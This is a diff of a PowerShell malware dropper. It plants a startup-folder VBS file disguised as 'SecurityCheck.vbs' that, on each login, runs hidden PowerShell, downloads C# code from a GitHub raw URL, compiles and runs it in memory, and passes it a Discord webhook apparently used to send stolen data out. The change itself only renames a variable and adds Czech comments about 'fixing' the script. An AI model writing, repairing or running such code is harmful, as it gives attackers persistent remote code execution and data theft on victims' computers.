@@ -2,7 +2,10 @@ $webhook = "https://discord.com/api/webhooks/1491728198092849215/DkCsPFapma_HMcU
 $github = "https://raw.githubusercontent.com/jfheifohfai/diwidwidid/refs/heads/main/bot.cs"
 $path = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityCheck.vbs"
 
-$code = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell -WindowStyle Hidden -Command `$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`", 0, False"
+# Tento řádek vytvoří VBS soubor se správnou syntaxí
+$vbsContent = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"powershell -WindowStyle Hidden -Command `$w='$webhook'; `$g='$github'; `$c=(iwr -UseBasicParsing `$g).Content; Add-Type -TypeDefinition `$c -ReferencedAssemblies 'System.Management','System.Net.Http','System.Drawing','System.Windows.Forms','System.IO'; [Program]::Main(`$w)`", 0, False"
 
-[System.IO.File]::WriteAllText($path, $code)
+[System.IO.File]::WriteAllText($path, $vbsContent)
+
+# Spustí opravenou verzi
 wscript.exe $path
